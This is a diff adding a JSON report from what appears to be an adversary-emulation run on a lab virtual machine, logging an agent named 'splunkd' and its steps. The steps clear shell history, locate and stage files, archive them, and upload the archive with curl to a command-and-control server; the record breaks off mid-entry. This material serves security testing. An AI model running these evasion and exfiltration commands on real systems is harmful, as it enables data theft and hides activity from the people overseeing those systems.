@@ -1,0 +1,969 @@
+{
+  "name": "Super spy",
+  "host_group": [
+    {
+      "privilege": "User",
+      "trusted": true,
+      "pid": 3258,
+      "location": "/home/cauacampos/splunkd",
+      "paw": "reqnhl",
+      "group": "red",
+      "proxy_receivers": {},
+      "upstream_dest": "http://192.168.15.106:8888",
+      "links": [
+        {
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "pid": "3270",
+          "relationships": [],
+          "executor": {
+            "variations": [],
+            "language": null,
+            "build_target": null,
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "timeout": 60,
+            "cleanup": [],
+            "additional_info": {},
+            "parsers": [],
+            "name": "sh",
+            "code": null,
+            "payloads": [],
+            "platform": "linux",
+            "uploads": []
+          },
+          "decide": "2023-06-01T15:35:15Z",
+          "jitter": 0,
+          "paw": "reqnhl",
+          "output": "False",
+          "deadman": false,
+          "status": 0,
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "cleanup": 0,
+          "unique": "eb099c23-28b8-4695-95d8-d519ede20b3b",
+          "collect": "2023-06-01T15:35:15Z",
+          "id": "eb099c23-28b8-4695-95d8-d519ede20b3b",
+          "ability": {
+            "access": {},
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "privilege": null,
+            "repeatable": false,
+            "technique_id": "T1070.003",
+            "description": "Stop terminal from logging history",
+            "singleton": false,
+            "additional_info": {},
+            "buckets": [
+              "defense-evasion"
+            ],
+            "delete_payload": true,
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "requirements": [],
+            "name": "Avoid logs",
+            "plugin": "stockpile",
+            "tactic": "defense-evasion",
+            "executors": [
+              {
+                "variations": [],
+                "language": null,
+                "build_target": null,
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "timeout": 60,
+                "cleanup": [],
+                "additional_info": {},
+                "parsers": [],
+                "name": "sh",
+                "code": null,
+                "payloads": [],
+                "platform": "darwin",
+                "uploads": []
+              },
+              {
+                "variations": [],
+                "language": null,
+                "build_target": null,
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "timeout": 60,
+                "cleanup": [],
+                "additional_info": {},
+                "parsers": [],
+                "name": "sh",
+                "code": null,
+                "payloads": [],
+                "platform": "linux",
+                "uploads": []
+              },
+              {
+                "variations": [],
+                "language": null,
+                "build_target": null,
+                "command": "Clear-History;Clear",
+                "timeout": 60,
+                "cleanup": [],
+                "additional_info": {},
+                "parsers": [],
+                "name": "psh",
+                "code": null,
+                "payloads": [],
+                "platform": "windows",
+                "uploads": []
+              }
+            ]
+          },
+          "score": 0,
+          "host": "cauacampos-VirtualBox",
+          "finish": "2023-06-01T15:35:15Z",
+          "facts": [],
+          "used": [],
+          "agent_reported_time": "2023-06-01T15:35:15Z",
+          "pin": 0
+        }
+      ],
+      "server": "http://192.168.15.106:8888",
+      "exe_name": "splunkd",
+      "pending_contact": "HTTP",
+      "architecture": "amd64",
+      "username": "cauacampos",
+      "platform": "linux",
+      "deadman_enabled": true,
+      "last_seen": "2023-06-01T16:06:07Z",
+      "display_name": "cauacampos-VirtualBox$cauacampos",
+      "proxy_chain": [],
+      "origin_link_id": "",
+      "sleep_max": 60,
+      "watchdog": 0,
+      "contact": "HTTP",
+      "created": "2023-06-01T15:35:15Z",
+      "host_ip_addrs": [
+        "10.0.2.15",
+        "192.168.15.158"
+      ],
+      "host": "cauacampos-VirtualBox",
+      "available_contacts": [
+        "HTTP"
+      ],
+      "ppid": 1798,
+      "sleep_min": 30,
+      "executors": [
+        "proc",
+        "sh"
+      ]
+    }
+  ],
+  "start": "2023-06-01T15:42:48Z",
+  "steps": {
+    "reqnhl": {
+      "steps": [
+        {
+          "link_id": "679ed246-3af3-4682-bdbc-cd8309115e56",
+          "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+          "command": "xclip -o",
+          "plaintext_command": "xclip -o",
+          "delegated": "2023-06-01T15:42:49Z",
+          "run": "2023-06-01T15:43:23Z",
+          "status": 1,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3573,
+          "description": "copy the contents for the clipboard and print them",
+          "name": "Copy Clipboard",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Clipboard Data",
+            "technique_id": "T1115"
+          },
+          "output": {
+            "stdout": "sh: 1: xclip: not found",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:43:23Z"
+        },
+        {
+          "link_id": "d62c7329-6d4b-4505-9039-8a1305c32887",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+          "delegated": "2023-06-01T15:43:24Z",
+          "run": "2023-06-01T15:44:18Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3576,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "/home/cauacampos/staged",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:44:18Z"
+        },
+        {
+          "link_id": "c2b8840b-320d-48f6-9cfa-958cf2fe81a2",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "find / -name '*.png' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "plaintext_command": "find / -name '*.png' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "delegated": "2023-06-01T15:44:19Z",
+          "run": "2023-06-01T15:45:06Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3591,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "output": {
+            "stdout": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/neovim-runtime_nvim.png/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/sioyek_sioyek-icon-linux.png",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:45:06Z"
+        },
+        {
+          "link_id": "d3a1afd5-e373-487b-9420-ee559ef50dd1",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "find / -name '*.yml' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "plaintext_command": "find / -name '*.yml' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "delegated": "2023-06-01T15:45:10Z",
+          "run": "2023-06-01T15:46:48Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3598,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "output": {
+            "stdout": "/usr/share/perl/5.36.0/CPAN/Kwalify/distroprefs.yml",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:46:31Z"
+        },
+        {
+          "link_id": "055bc2af-3f96-42d3-bc6d-77fe93c246e2",
+          "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+          "command": "find / -name '*.wav' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "plaintext_command": "find / -name '*.wav' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
+          "delegated": "2023-06-01T15:46:50Z",
+          "run": "2023-06-01T15:48:06Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3614,
+          "description": "Locate files deemed sensitive",
+          "name": "Find files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data from Local System",
+            "technique_id": "T1005"
+          },
+          "output": {
+            "stdout": "/usr/share/ibus-table/data/coin9.wav/usr/share/sounds/alsa/Front_Right.wav/usr/share/sounds/alsa/Side_Left.wav/usr/share/sounds/alsa/Front_Left.wav/usr/share/sounds/alsa/Rear_Left.wav",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:48:05Z"
+        },
+        {
+          "link_id": "b333a24d-03ba-4274-9f0a-386a4f3eeb06",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png /home/cauacampos/staged",
+          "plaintext_command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png /home/cauacampos/staged",
+          "delegated": "2023-06-01T15:48:10Z",
+          "run": "2023-06-01T15:48:44Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3617,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2023-06-01T15:48:44Z"
+        },
+        {
+          "link_id": "dc02dfea-7210-4cf5-9454-04539d12c8ed",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png /home/cauacampos/staged",
+          "plaintext_command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png /home/cauacampos/staged",
+          "delegated": "2023-06-01T15:48:46Z",
+          "run": "2023-06-01T15:49:28Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3632,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2023-06-01T15:49:28Z"
+        },
+        {
+          "link_id": "1e297367-056d-4bf5-8db8-009fea7d5728",
+          "ability_id": "4e97e699-93d7-4040-b5a3-2e906a58199e",
+          "command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png /home/cauacampos/staged",
+          "plaintext_command": "cp /var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png /home/cauacampos/staged",
+          "delegated": "2023-06-01T15:49:31Z",
+          "run": "2023-06-01T15:50:16Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3723,
+          "description": "copy files to staging directory",
+          "name": "Stage sensitive files",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "agent_reported_time": "2023-06-01T15:50:16Z"
+        },
+        {
+          "link_id": "cf7a99c2-e8b2-47e9-b270-81720fd8f356",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "tar -P -zcf /home/cauacampos/staged.tar.gz /home/cauacampos/staged && echo /home/cauacampos/staged.tar.gz",
+          "plaintext_command": "tar -P -zcf /home/cauacampos/staged.tar.gz /home/cauacampos/staged && echo /home/cauacampos/staged.tar.gz",
+          "delegated": "2023-06-01T15:50:17Z",
+          "run": "2023-06-01T15:51:00Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3728,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "/home/cauacampos/staged.tar.gz",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:51:00Z"
+        },
+        {
+          "link_id": "fdf59fef-176f-492d-851d-050767308bed",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "curl -F \"data=@/home/cauacampos/staged.tar.gz\" --header \"X-Request-ID: `hostname`-reqnhl\" http://192.168.15.106:8888/file/upload",
+          "plaintext_command": "curl -F \"data=@/home/cauacampos/staged.tar.gz\" --header \"X-Request-ID: `hostname`-reqnhl\" http://192.168.15.106:8888/file/upload",
+          "delegated": "2023-06-01T15:51:04Z",
+          "run": "2023-06-01T15:51:42Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3744,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "output": {
+            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100 14191    0     0  100 14191      0  1945k --:--:-- --:--:-- --:--:-- 1979k",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:51:42Z"
+        },
+        {
+          "link_id": "a9eda2c6-e2f7-41a7-80a9-62425aa67565",
+          "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+          "command": "./obfuscated_payload.sh scan",
+          "plaintext_command": "./obfuscated_payload.sh scan",
+          "delegated": "2023-06-01T15:51:44Z",
+          "run": "2023-06-01T15:52:23Z",
+          "status": 1,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3748,
+          "description": "View all potential WIFI networks on host",
+          "name": "Scan WIFI networks",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "sh: 1: ./obfuscated_payload.sh: not found",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:52:23Z"
+        },
+        {
+          "link_id": "0d06921a-e7dc-4ede-9200-3a5dc944f29f",
+          "ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+          "command": "./wifi.sh pref",
+          "plaintext_command": "./wifi.sh pref",
+          "delegated": "2023-06-01T15:52:25Z",
+          "run": "2023-06-01T15:53:25Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 3773,
+          "description": "See the most used WIFI networks of a machine",
+          "name": "Preferred WIFI",
+          "attack": {
+            "tactic": "discovery",
+            "technique_name": "System Network Configuration Discovery",
+            "technique_id": "T1016"
+          },
+          "output": {
+            "stdout": "AUTOCONNECT-PRIORITY  NAME               -999                  Wired connection 1 -999                  Conexão cabeada 1  0                     lo                 ",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-06-01T15:53:25Z"
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "atomic",
+  "adversary": {
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "description": "Monitor the active user and navigate through their digital belongings",
+    "name": "Super Spy",
+    "plugin": "stockpile",
+    "adversary_id": "564ae20d-778d-4965-93dc-b523be2e2ab4",
+    "has_repeatable_abilities": false,
+    "atomic_ordering": [
+      "316251ed-6a28-4013-812b-ddf5b5b007f8",
+      "b007fe0c-c6b0-4fda-915c-255bbc070de2",
+      "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
+      "78524da1-f347-4fbb-9295-209f1f408330",
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "4e97e699-93d7-4040-b5a3-2e906a58199e",
+      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "2dece965-37a0-4f70-a391-0f30e3331aba",
+      "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
+      "a0676fe1-cd52-482e-8dde-349b73f9aa69",
+      "1b4fb81c-8090-426c-93ab-0a633e7a16a7",
+      "de52784d-4de6-4d4e-b79e-e7b68fe037fb"
+    ]
+  },
+  "jitter": "2/8",
+  "objectives": {
+    "description": "This is a default objective that runs forever.",
+    "goals": [
+      {
+        "target": "exhaustion",
+        "achieved": false,
+        "count": 1048576,
+        "operator": "==",
+        "value": "complete"
+      }
+    ],
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "percentage": 0,
+    "name": "default"
+  },
+  "facts": [
+    {
+      "created": "2023-06-01T15:42:48Z",
+      "technique_id": "",
+      "origin_type": "SEEDED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/ibus-table/data/coin9.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/alsa/Front_Right.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/alsa/Side_Left.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/alsa/Front_Left.wav) : has_extension : file.sensitive.extension(wav)",
+        "host.file.path(/usr/share/sounds/alsa/Rear_Left.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [],
+      "unique": "file.sensitive.extensionwav",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "file.sensitive.extension",
+      "limit_count": -1,
+      "trait": "file.sensitive.extension",
+      "value": "wav",
+      "score": 6
+    },
+    {
+      "created": "2023-06-01T15:42:48Z",
+      "technique_id": "",
+      "origin_type": "SEEDED",
+      "links": [
+        "d3a1afd5-e373-487b-9420-ee559ef50dd1"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/perl/5.36.0/CPAN/Kwalify/distroprefs.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "collected_by": [],
+      "unique": "file.sensitive.extensionyml",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "file.sensitive.extension",
+      "limit_count": -1,
+      "trait": "file.sensitive.extension",
+      "value": "yml",
+      "score": 2
+    },
+    {
+      "created": "2023-06-01T15:42:48Z",
+      "technique_id": "",
+      "origin_type": "SEEDED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/neovim-runtime_nvim.png) : has_extension : file.sensitive.extension(png)",
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/sioyek_sioyek-icon-linux.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [],
+      "unique": "file.sensitive.extensionpng",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "file.sensitive.extension",
+      "limit_count": -1,
+      "trait": "file.sensitive.extension",
+      "value": "png",
+      "score": 6
+    },
+    {
+      "created": "2023-06-01T15:42:48Z",
+      "technique_id": "",
+      "origin_type": "SEEDED",
+      "links": [],
+      "relationships": [],
+      "collected_by": [],
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "name": "server.malicious.url",
+      "limit_count": -1,
+      "trait": "server.malicious.url",
+      "value": "keyloggedsite.com",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:44:18Z",
+      "technique_id": "T1074.001",
+      "origin_type": "LEARNED",
+      "links": [
+        "d62c7329-6d4b-4505-9039-8a1305c32887"
+      ],
+      "relationships": [
+        "host.dir.staged(/home/cauacampos/staged)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.dir.staged/home/cauacampos/staged",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.dir.staged",
+      "limit_count": -1,
+      "trait": "host.dir.staged",
+      "value": "/home/cauacampos/staged",
+      "score": 2
+    },
+    {
+      "created": "2023-06-01T15:45:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/meshlab_meshlab.png",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:45:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/kgoldrunner_kgoldrunner.png",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:45:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/geeqie_geeqie.png",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:45:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/neovim-runtime_nvim.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/neovim-runtime_nvim.png",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/neovim-runtime_nvim.png",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:45:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "c2b8840b-320d-48f6-9cfa-958cf2fe81a2"
+      ],
+      "relationships": [
+        "host.file.path(/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/sioyek_sioyek-icon-linux.png) : has_extension : file.sensitive.extension(png)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/sioyek_sioyek-icon-linux.png",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/var/lib/swcatalog/icons/ubuntu-lunar-universe/64x64/sioyek_sioyek-icon-linux.png",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:46:48Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "d3a1afd5-e373-487b-9420-ee559ef50dd1"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/perl/5.36.0/CPAN/Kwalify/distroprefs.yml) : has_extension : file.sensitive.extension(yml)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/perl/5.36.0/CPAN/Kwalify/distroprefs.yml",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/perl/5.36.0/CPAN/Kwalify/distroprefs.yml",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:48:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/ibus-table/data/coin9.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/ibus-table/data/coin9.wav",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/ibus-table/data/coin9.wav",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:48:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/sounds/alsa/Front_Right.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/sounds/alsa/Front_Right.wav",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/sounds/alsa/Front_Right.wav",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:48:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/sounds/alsa/Side_Left.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/sounds/alsa/Side_Left.wav",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/sounds/alsa/Side_Left.wav",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:48:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/sounds/alsa/Front_Left.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/sounds/alsa/Front_Left.wav",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/sounds/alsa/Front_Left.wav",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:48:06Z",
+      "technique_id": "T1005",
+      "origin_type": "LEARNED",
+      "links": [
+        "055bc2af-3f96-42d3-bc6d-77fe93c246e2"
+      ],
+      "relationships": [
+        "host.file.path(/usr/share/sounds/alsa/Rear_Left.wav) : has_extension : file.sensitive.extension(wav)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.file.path/usr/share/sounds/alsa/Rear_Left.wav",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.file.path",
+      "limit_count": -1,
+      "trait": "host.file.path",
+      "value": "/usr/share/sounds/alsa/Rear_Left.wav",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:51:00Z",
+      "technique_id": "T1560.001",
+      "origin_type": "LEARNED",
+      "links": [
+        "cf7a99c2-e8b2-47e9-b270-81720fd8f356"
+      ],
+      "relationships": [
+        "host.dir.compress(/home/cauacampos/staged.tar.gz)"
+      ],
+      "collected_by": [
+        "reqnhl"
+      ],
+      "unique": "host.dir.compress/home/cauacampos/staged.tar.gz",
+      "source": "2947d1a0-058e-4706-84e5-3a38ab971119",
+      "name": "host.dir.compress",
+      "limit_count": -1,
+      "trait": "host.dir.compress",
+      "value": "/home/cauacampos/staged.tar.gz",
+      "score": 1
+    },
+    {
+      "created": "2023-06-01T15:52:23Z",
+      "technique_id": "T1016",
+      "origin_type": "LEARNED",
+      "links": [
